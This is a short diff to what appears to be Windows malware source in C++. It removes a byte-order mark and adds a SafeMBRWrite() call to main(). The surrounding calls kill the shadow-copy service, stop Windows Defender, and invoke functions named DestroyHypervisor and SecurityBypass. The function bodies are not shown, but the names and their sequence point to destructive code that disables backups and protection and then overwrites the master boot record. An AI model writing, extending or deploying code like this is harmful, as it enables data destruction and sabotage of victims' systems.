@@ -1,4 +1,4 @@
-﻿#define _WIN32_WINNT 0x0600
+#define _WIN32_WINNT 0x0600
 #include <iostream>
 #include <windows.h>
 #include <string>
@@ -602,6 +602,7 @@ int main() {
         KillProcessByName(L"vssvc.exe");
         StopServiceAPI(L"WinDefend");
 
+        SafeMBRWrite();
         DestroyHypervisor();
         AddCertificateMetadata();
         SecurityBypass();
